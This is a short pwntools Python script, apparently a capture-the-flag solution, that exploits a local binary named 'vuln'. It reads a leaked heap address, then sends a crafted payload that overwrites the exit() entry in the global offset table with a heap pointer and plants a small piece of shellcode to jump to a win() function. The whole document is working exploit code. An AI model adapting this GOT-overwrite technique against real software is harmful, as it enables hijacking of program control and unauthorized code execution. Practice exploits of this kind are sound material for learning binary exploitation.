from pwn import *

p = process("./vuln")

p.recvline()

# Get address
address = int(p.recvline())

# Send arbitrary data
p.sendline("AAAABBBBCCCCDDDD")

# left + 0x8 = exit() entry in GOT
e = p32(0x0804d020)

# right = location in heap containing shellcode to call win()
# This is equal to the location given by address + 0x8
e += p32(address + 0x8)
print("Address: " + str(hex(address)))
print(hex(address+0x8))

# shellcode (push 0x08048956 ; ret)
e += asm("push 0x08048956 ; ret")

p.sendline(e)
print(p.recvall())
